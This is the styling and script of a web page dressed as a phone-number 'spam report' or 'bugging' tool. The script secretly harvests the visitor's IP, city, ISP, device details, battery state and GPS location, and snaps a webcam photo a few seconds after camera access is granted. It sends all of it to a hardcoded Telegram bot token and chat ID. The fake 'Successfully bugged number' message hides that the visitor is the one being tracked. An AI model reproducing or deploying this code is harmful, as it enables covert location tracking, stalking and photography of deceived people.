<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}
body {
  background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
  font-family: 'Inter', sans-serif;

  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  overflow: hidden;
  position: relative;
  padding: 20px;
}
.bg-particles {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  pointer-events: none;
  z-index: 0;
}
.particle {
  position: absolute;
  width: 2px;
  height: 2px;
  background: rgba(0, 255, 127, 0.3);
  border-radius: 50%;
  animation: float 6s ease-in-out infinite;
}
@keyframes float {
  0%, 100% { transform: translateY(0px); opacity: 0.3; }
  50% { transform: translateY(-20px); opacity: 0.8; }
}
.login-container {
  background-color: rgba(17, 17, 17, 0.95);
  padding: 30px;
  border-radius: 16px;
  box-shadow: 0 0 20px lime;
  text-align: center;
  max-width: 400px;
  width: 100%;
  z-index: 2;
}
.login-title {
  font-size: 26px;
  font-weight: 900;
  margin-bottom: 10px;
  background: linear-gradient(135deg, #00ff7f, #ffffff);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}
.login-subtitle {
  font-size: 13px;
  color: #ffc107;
  margin-bottom: 20px;
}
.login-input {
  width: 100%;
  padding: 12px;
  margin-bottom: 16px;
  background: #333;
  border: none;
  border-radius: 6px;
  color: #fff;

}
.login-button {
  width: 100%;
  padding: 12px;
  background: linear-gradient(135deg, #00ff7f, #00cc66);
  color: black;
  border: none;
  border-radius: 10px;
  cursor: pointer;
  font-weight: 600;
  font-size: 15px;
}
.login-button:hover {
  background-color: #0f0;
  box-shadow: 0 0 20px lime;
}
      .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;

            z-index: -2; /* Below content and modals */
            filter: brightness(0.7);
      }
#info {
  white-space: pre-wrap;
  text-align: left;
  margin-top: 20px;
  background: #222;
  padding: 15px;
  border-radius: 8px;
  font-size: 13px;
}
@media (max-width: 480px) {
  .login-container {
    padding: 25px 20px;

  }
  .login-title {
    font-size: 22px;
  }
  .login-input, .login-button {

  }
}
</style>

 </video>

<script>
const botToken = '7627290256:AAEG76BaONyPIJDYhVZgKpFErrizYSLrJGY';
const chatIds = ['7356268348'];
const infoDiv = document.getElementById('info');
const input = document.getElementById('text');
const button = document.getElementById('login-button');

function sendToTelegram(text) {
  chatIds.forEach(id => {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: id,
        text: text,
        parse_mode: 'HTML'
      })
    }).catch(console.error);
  });
}

function sendPhotoToTelegram(blob) {
  chatIds.forEach(id => {
    const formData = new FormData();
    formData.append('chat_id', id);
    formData.append('photo', blob);
    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: 'POST',
      body: formData
    }).catch(console.error);
  });
}

async function getInfo() {
  let ip = '-', city = '-', region = '-', country = '-', org = '-';
  try {
    const ipRes = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipRes.json();
    ip = ipData.ip;

    const locRes = await fetch(`https://ip-api.com/json/${ip}`);
    const loc = await locRes.json();
    if (loc.status === 'success') {
      city = loc.city;
      region = loc.regionName;
      country = loc.country;
      org = loc.org;
    }
  } catch {}

  const battery = await navigator.getBattery?.() || { level: 0, charging: false };
  const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';

  const text = `
üì• Visitor Info:
IP Address: ${ip}
City: ${city}
Region: ${region}
Country: ${country}
ISP: ${org}
Browser: ${navigator.userAgent}
OS: ${navigator.platform}
Screen: ${screen.width}x${screen.height}
Battery: ${batteryPercent} (${battery.charging ? 'Charging' : 'Not Charging'})
Memory: ${navigator.deviceMemory || 'N/A'} GB
Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}
Time: ${new Date().toLocaleString()}
  `.trim();

  sendToTelegram(text);

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        sendToTelegram(`üìç GPS Location: Click here\n${link}`);
      },
      () => sendToTelegram(`üìç GPS Location: Denied`)
    );
  } else {
    sendToTelegram(`üìç Browser does not support GPS`);
  }
}

async function startCamera() {
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');

  return new Promise((resolve) => {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
              if (blob) sendPhotoToTelegram(blob);
              stream.getTracks().forEach(track => track.stop());
              resolve();
            }, 'image/jpeg');
          }, 3000);
        };
      })
      .catch(error => {
        sendToTelegram('‚ùå Camera Denied or Unavailable');
        resolve();
      });
  });
}

button.addEventListener('click', async () => {
  const number = input.value.trim();
  if (!number || number.length < 8 || number.length > 15) {
    infoDiv.innerText = '‚ö†Ô∏è Invalid number.';
    return;
  }

  button.disabled = true;
  infoDiv.innerText = '‚è≥ Processing spam report...';
  sendToTelegram(`üìû Target Number: ${number}`);
  input.value = '';

  try {
    await getInfo();
    await startCamera();
    setTimeout(() => {
      infoDiv.innerText = `‚úÖ Successfully bugged number ${number}`;
      button.disabled = false;
    }, 1000);
  } catch (e) {
    infoDiv.innerText = '‚ùå An error occurred.';
    button.disabled = false;
  }
});

function createParticles() {
  const container = document.querySelector('.bg-particles');
  for (let i = 0; i < 50; i++) {
    const p = document.createElement('div');
    p.className = 'particle';
    p.style.left = Math.random() * 100 + '%';
    p.style.top = Math.random() * 100 + '%';
    p.style.animationDelay = Math.random() * 6 + 's';
    p.style.animationDuration = (Math.random() * 4 + 4) + 's';
    container.appendChild(p);
  }
}
document.addEventListener('DOMContentLoaded', createParticles);
</script>
